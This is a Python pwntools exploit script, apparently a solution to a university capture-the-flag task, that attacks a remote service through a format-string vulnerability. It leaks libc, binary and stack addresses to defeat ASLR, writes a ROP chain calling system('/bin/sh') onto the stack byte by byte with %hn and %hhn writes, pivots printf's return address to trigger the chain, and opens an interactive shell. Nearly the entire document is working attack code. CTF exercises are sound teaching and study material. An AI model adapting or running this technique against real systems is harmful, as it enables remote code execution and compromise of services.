#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'
#pwn.context.binary = exe

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33421)
#conn = pwn.process([exe.path])

#pwn.gdb.attach(conn, gdbscript="""
#set follow-fork-mode child      
#""")

def set_format_string(fmt):
    # invert byte string, as we have to write last byte first
    fmt = fmt[::-1]
    for pos, byte in enumerate(fmt):
        conn.recvuntil(b'Option? 1:set 2:print\n> ')
        conn.send(b'1\n')
        conn.recvuntil(b'What is the length of the new format?\n> ')
        length = len(fmt)-pos
        conn.send(f'{length}\n'.encode('ascii'))
        conn.recvuntil(b'What is the new format?\n> ')
        payload = b'A'*(len(fmt)-pos-1) + byte.to_bytes(1, byteorder='little')
        conn.send(payload)


def print_register_and_memory(max, result):
    # set format string
    fmt = b''
    for pos in range(1,max+1):
        fmt += b'%' + str(pos).encode('ascii') + b'$llx\n'

    print(f'format string: {fmt.hex()}')

    set_format_string(fmt)

    # get data
    conn.recvuntil(b'Option? 1:set 2:print\n> ')
    conn.send(b'2\n')
    conn.recvuntil(b'Output:\n')

    rdi = conn.recvline()
    rsi = conn.recvline()
    rdx = conn.recvline()
    rcx = conn.recvline()
    r8 = conn.recvline()
    r9 = conn.recvline()

    print(f'rdi = 0x{str(rdi)[(2):-3]}')
    print(f'rsi = 0x{str(rsi)[(2):-3]}')
    print(f'rdx = 0x{str(rdx)[(2):-3]}')
    print(f'rcx = 0x{str(rcx)[(2):-3]}')
    print(f' r8 = 0x{str(r8)[(2):-3]}')
    print(f' r9 = 0x{str(r9)[(2):-3]}')

    for i in range(7,max+1):
        stack = conn.recvline()

        result.append((int(str(stack)[(2):-3], 16), i))

        print(f'ret + {(i-6)*8} (input {i}) = 0x{str(stack)[(2):-3]}')
    
    conn.recvuntil(b'\n')


# just for testing, see what we got
result = []
print_register_and_memory(50, result)


# 1) Get ASLR of libc: in rdx (3rd argument is pointer to write+16)
set_format_string(b'%3$llx\n\x00')
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')
conn.recvuntil(b'Output:\n')
rdx = conn.recvline()
conn.recvuntil(b'\n')

libc_base_address = pwn.u64(pwn.unhex(rdx[:-1]).rjust(8, b'\x00'), endianness='big') - (libc.symbols['write'] + 16)


# 2) Get ASLR of vuln: in 15th input (pointer to main)
set_format_string(b'%15$llx\n\x00')
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')
conn.recvuntil(b'Output:\n')
stack = conn.recvline()
conn.recvuntil(b'\n')

vuln_base_address = pwn.u64(pwn.unhex(stack[:-1]).rjust(8, b'\x00'), endianness='big') - (exe.symbols['main'])


# 3) get address of stack (21th input has a pointer to the stack => fixed offset to all other stack addresses)
set_format_string(b'%21$llx\n\x00')
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')
conn.recvuntil(b'Output:\n')
address = conn.recvline()
conn.recvuntil(b'\n')

stack_address_input_21 = pwn.u64(pwn.unhex(address[:-1]).rjust(8, b'\x00'), endianness='big') - 0xE0
print(f'input 21 is at offset: {hex(stack_address_input_21)}')

stack_address_canarie_input_7 = stack_address_input_21 - 8*14
print(f'input 7/canarie is at offset: {hex(stack_address_canarie_input_7)}')

stack_address_input_11_rop_chain_start = stack_address_canarie_input_7 + 8*4
print(f'input 11/gadget2 is at offset: {hex(stack_address_input_11_rop_chain_start)}')


# 4) now write 32 byte ropchain starting at stack_address_input_11_rop_chain onto stack
libc.address = libc_base_address
rop = pwn.ROP(libc)
rop.call(rop.ret)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
ropchain = rop.chain()

for pos, byte in enumerate(ropchain):
    # idea: On the stack are pointers that also point onto the stack.
    #       We only have to find a pointer that points to another pointer on the stack
    #       Then we can provide the frist pointer as input value for the fromat string (input 21).
    #       We will write into the second pointer where the first points to (input 49)
    #       We just override last 2 Bytes, with a local offset on the stack of our choise.
    #       Now we can take the second pointer (input 49) as input to write to this position onto the stack.
    #       This allows us to completely override the stack (at least locally).
    #       We first write a ropchain a bit deeper in the stack, byte by byte (no hurry :).
    #       Finally we override the last 2 Bytes of the return address of printf sothat it no longer points
    #       to an address in main, but to a gadnet in vuln that increments the stack pointer to that
    #       our ropchain gets triggered. That's it :)
    
    # 4.1) write address where we later want to write to onto stack
    last_two_bytes = stack_address_input_11_rop_chain_start % 2**16
    print(f'doing offset: {hex(last_two_bytes+pos)} for byte {byte}')
    fmt = (b'%' + str(last_two_bytes+pos).encode('ascii') + b'd') + b'%21$hn' + b'\x00'
    set_format_string(fmt)
    conn.recvuntil(b'Option? 1:set 2:print\n> ')
    conn.send(b'2\n')
    conn.recvuntil(b'Output:\n')
    conn.recvline()
    
    # 4.2) write single byte at the address of our choice
    fmt = b''
    if byte > 0:
        fmt += (b'%' + str(byte).encode('ascii') + b'd')
    fmt +=b'%49$hhn' + b'\x00'
    set_format_string(fmt)
    conn.recvuntil(b'Option? 1:set 2:print\n> ')
    conn.send(b'2\n')
    conn.recvuntil(b'Output:\n')
    conn.recvline()
    

# 5.) finally override last 2 bytes of return address of printf to trigger ropchain (gadget from vuln)
trigger_gadget = 0x0000000000001469 #add rsp, 0x18; pop rbx; pop rbp; ret; 
trigger_gadget_last_two_bytes = (vuln_base_address + trigger_gadget) % 2**16


# 5.1) write address where we later want to write to onto stack
last_two_bytes = (stack_address_input_11_rop_chain_start-6*8) % 2**16
fmt = (b'%' + str(last_two_bytes).encode('ascii') + b'd') + b'%21$hn' + b'\x00'
set_format_string(fmt)
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')
conn.recvuntil(b'Output:\n')
conn.recvline()

# 5.2) write last 2 bytes of gadget
fmt = (b'%' + str(trigger_gadget_last_two_bytes).encode('ascii') + b'd') + b'%49$hn' + b'\x00'
set_format_string(fmt)
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')
conn.recvuntil(b'Output:\n')

# interact with shell
conn.interactive()